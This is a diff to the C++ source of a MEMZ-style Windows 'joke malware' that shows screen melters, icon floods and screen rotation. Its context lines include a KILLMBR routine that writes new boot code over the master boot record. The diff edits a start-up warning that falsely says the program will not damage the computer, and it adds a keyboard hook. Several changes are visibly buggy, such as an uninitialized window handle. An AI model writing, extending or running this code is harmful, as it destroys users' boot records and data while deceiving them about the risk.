@@ -1,6 +1,6 @@
 #include <windows.h>
 #include <shellapi.h>
-#include <werapi.h>
+#include <werapi.h> 
 #include <winable.h>
 #include <tchar.h>
 #include <stdlib.h>
@@ -8,7 +8,7 @@
 #include <vector>
 #include <cstdio>
 #include <pthread.h>
-#include <iostream>
+#include <iostream> 
 #include <dirent.h>
 #include <Mmsystem.h>
 #include <math.h>
@@ -17,11 +17,11 @@
 #include <string>
 #include <random>
 #include <regex>
-#include <cstdlib>
+#include <conio.h>
 
 #pragma once
 
-#define random_in(a,b) (rand()%(b-a)+a)
+#define random_in(a,b) (rand()%(b-a)+a) 
 #define random_list(x) (rand()%x)
 #define DESKTOP_WINDOW ((HWND)0)
 #define PI 3.1415926
@@ -41,7 +41,8 @@ LPCWSTR lpPaths[13] = {
     L"wininit.exe",
     L"werfault.exe",
     L"winver.exe",
-    L"regedit.exe"
+    L"regedit.exe" 
+    
 };
 
 HCRYPTPROV prov;
@@ -430,6 +431,7 @@ void infCursor(){
 void RandIcon(){
     int cx = GetSystemMetrics(SM_CXFULLSCREEN);
     int cy = GetSystemMetrics(SM_CYFULLSCREEN);
+    HWND hwnd = GetDesktopWindow();
     HDC hdc = GetWindowDC(hwnd);
     DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_QUESTION));
     DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_WARNING));
@@ -453,7 +455,7 @@ void KILLMBR(){
     unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);
 
     // Join the two code parts together
-    long long unsigned int i = 0;
+    int i = 0;
     for (; i < code1_len; i++)
         *(bootcode + i) = *(code1 + i);
     for (i = 0; i < code2_len; i++)
@@ -602,7 +604,7 @@ void ScreenMelter(){
     srand((unsigned) time(&t));
     
     HDC screenDC = GetDC(NULL);
-
+    
     int scrWidth = GetDeviceCaps(screenDC, HORZRES);
     int scrHeight = GetDeviceCaps(screenDC, VERTRES);
     
@@ -611,7 +613,7 @@ void ScreenMelter(){
         HDC screenDC = GetDC(NULL);
         x = rand() % scrWidth;
         BitBlt(screenDC, x, 1, 10, scrHeight, screenDC, x, 0, SRCCOPY);
-        //Sleep(2);
+        Sleep(2);
     }
 }
 void Shake(){
@@ -654,7 +656,8 @@ void iconAura(){
     HWND hwnd = GetDesktopWindow();
     HDC hdc = GetWindowDC(hwnd);
          //寄存器//
-    SendMessage(hwnd, WM_SETREDRAW, FALSE, 0L);
+    HWND hWnd;
+    SendMessage(hWnd, WM_SETREDRAW, FALSE, 0L);
     
     while(true)
     {
@@ -677,7 +680,7 @@ void iconAura(){
             DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_INFORMATION));
             DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_WINLOGO));
             //Sleep(25);
-        }
+        }    
     }
 }
 void randomSeed(){
@@ -772,17 +775,15 @@ void OrientationsScreen()
     // 随机旋转屏幕
     for (;;)
     {
-        // 等待一会
-        Sleep(8000);
-
         // 随机选择一个旋转角度
         DWORD orientation = orientations[dis(gen)];
 
         // 设置屏幕旋转角度
         dm.dmDisplayOrientation = orientation;
         ChangeDisplaySettings(&dm, 0);
-        // 等待一段时间
 
+        // 等待一段时间
+        Sleep(500);
     }
 
     // 恢复默认方向
@@ -791,13 +792,17 @@ void OrientationsScreen()
 }
 
 void StartWarning(){
-    if (MessageBoxA(NULL, "This is a joke malware!\n\
+    if (MessageBoxA(NULL, "This is a joke malware! :D\n\
 This will not damage your computer in any way.\n\
-Click 'OK' to run the program,Click 'Cancel' to close the program\n\
+Click 'OK' to run the program,Click 'Cancel' to close the program!\n\
 Have fun~\n\n\
-THE CONTENT OF THIS UPDATE IS: CUTEER TEXT & WARNING", "Kris's MEMZ [1.38.9]", MB_YESNO | MB_ICONWARNING) != IDYES) {
+译文:\n\
+这是一个玩笑木马! :D\n\
+这将不会破坏你的电脑!\n\
+点击'确定'运行程序,点击'取消'关闭程序!\n\
+玩的开心~\n\n", "Kris's MEMZ [Version: 1.40.0]", MB_YESNO | MB_ICONWARNING) != IDYES) {
 	ExitProcess(0);
-}
+    }
 }
 
 void CreateNote(){
@@ -805,4 +810,66 @@ void CreateNote(){
     WriteFile(note, msg, msg_len, &wb, NULL);
     CloseHandle(note);
     ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);
+}
+
+void printf_rgb(int r,int g, int b, char Text, BOOL IsForeground){
+    switch (IsForeground){
+        case true: // IsForegroundColor
+            printf("\x1b[38;2;%d;%d;%dm%s\x1b[0m",r,g,b,Text);
+            break;
+        case false: // NotForegroundColor
+            printf("\x1b[48;2;%d;%d;%dm%s\x1b[0m",r,g,b,Text);
+            break;
+        default:
+            printf("\x1b[38;2;%d;%d;%dm%s\x1b[0m",r,g,b,Text);
+            break;
+    }
+}
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	/*
+	typedef struct tagKBDLLHOOKSTRUCT {
+	DWORD     vkCode;		// 按键代号
+	DWORD     scanCode;		// 硬件扫描代号，同 vkCode 也可以作为按键的代号。
+	DWORD     flags;		// 事件类型，一般按键按下为 0 抬起为 128。
+	DWORD     time;			// 消息时间戳
+	ULONG_PTR dwExtraInfo;	// 消息附加信息，一般为 0。
+	}KBDLLHOOKSTRUCT,*LPKBDLLHOOKSTRUCT,*PKBDLLHOOKSTRUCT;
+	*/
+	KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;		// 包含低级键盘输入事件信息
+
+	DWORD code = ks->vkCode;
+
+    if (code == 13){ // Space
+        printf("Pressed Space, Aborting...\n");
+        ExitProcess(-1); // Exit
+    }
+
+    if (code == 27){ // Escape
+        printf("Pressed Escape, Aborting...\n");
+        ExitProcess(-1); // Exit
+    }
+
+	//return 1;	// 吃掉消息
+	return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+
+void InstallKeyboardHook()
+{
+	HINSTANCE hM = GetModuleHandle(NULL), hK = GetModuleHandle(NULL);
+	HHOOK g_Hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hK, 0);	//WH_KEYBOARD_LL 13 
+
+	// 消息循环是必须的，Windows直接在你自己的进程中调用你的hook回调.要做这个工作,
+	//需要一个消息循环.没有其他机制可以让您的主线程进行回调,
+	//回调只能在您调用Get / PeekMessage()以使Windows可以控制时发生.
+
+	MSG msg;
+	while (GetMessage(&msg, NULL, 0, 0))
+	{
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
+
+	//UnhookWindowsHookEx(g_Hook);
 }
